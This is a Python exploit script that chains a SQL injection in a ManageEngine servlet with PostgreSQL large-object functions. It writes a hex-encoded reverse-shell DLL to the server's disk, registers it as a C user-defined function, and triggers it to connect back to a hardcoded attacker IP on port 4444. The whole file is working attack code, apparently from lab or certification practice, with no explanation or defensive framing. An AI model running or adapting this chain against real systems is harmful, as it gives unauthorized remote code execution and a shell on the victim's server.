import requests, sys, urllib, string, random, time
requests.packages.urllib3.disable_warnings()
import binascii

def make_request(url, sql):
   print("[*] Executing query: {0}".format(sql[0:80]))
   r = requests.get(url.format(sql), verify=False)
   return r

def delete_lo(url, loid):
   print("[+] Deleting existing LO...")
   sql = "SELECT lo_unlink({0})".format(loid)
   make_request(url, sql)

def create_lo(url, loid):
   print("[+] Creating LO for UDF injection...")
   sql = "SELECT lo_import($$C:\\windows\\win.ini$$,{0})".format(loid)
   make_request(url, sql)
   
def inject_udf(url, loid):
   print("[+] Injecting payload of length {0} into LO...".format(len(udf)))
   for i in range(0,int((round(len(udf)/4096)))):

        udf_chunk = udf[i*4096:(i+1)*4096]
        if i == 0:
            sql = "UPDATE PG_LARGEOBJECT SET data=decode($${0}$$, $$hex$$) where loid={1} and pageno={2}".format(udf_chunk, loid, i)
        else:
            sql = "INSERT INTO PG_LARGEOBJECT (loid, pageno, data) VALUES ({0}, {1}, decode($${2}$$, $$hex$$))".format(loid, i, udf_chunk)
        make_request(url, sql)

def export_udf(url, loid):
   print("[+] Exporting UDF library to filesystem...")
   sql = "SELECT lo_export({0" \
         "}, $$C:\\Users\\Public\\rev_shell.dll$$)".format(loid)
   make_request(url, sql)
   
def create_udf_func(url):
   print("[+] Creating function...")
   sql = "create or replace function rev_shell(text, integer) returns VOID as $$C:\\Users\\Public\\rev_shell.dll$$, $$connect_back$$ language C strict"
   make_request(url, sql)

def trigger_udf(url, ip, port):
   print("[+] Launching reverse shell...")
   sql = "select rev_shell($${0}$$, {1})".format(ip, int(port))
   make_request(url, sql)
   
if __name__ == '__main__':
    # encoded UDF dll
    with open('reverse.dll', 'rb') as file:
        udf = binascii.hexlify(file.read())
        print(udf)
    loid = 1337

    attacker = '192.168.119.147'
    port = 4444
    sqli_url  = "https://manageengine:8443/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;{0};--"
    delete_lo(sqli_url, loid)
    create_lo(sqli_url, loid)
    inject_udf(sqli_url, loid)
    export_udf(sqli_url, loid)
    create_udf_func(sqli_url)
    trigger_udf(sqli_url, attacker, port)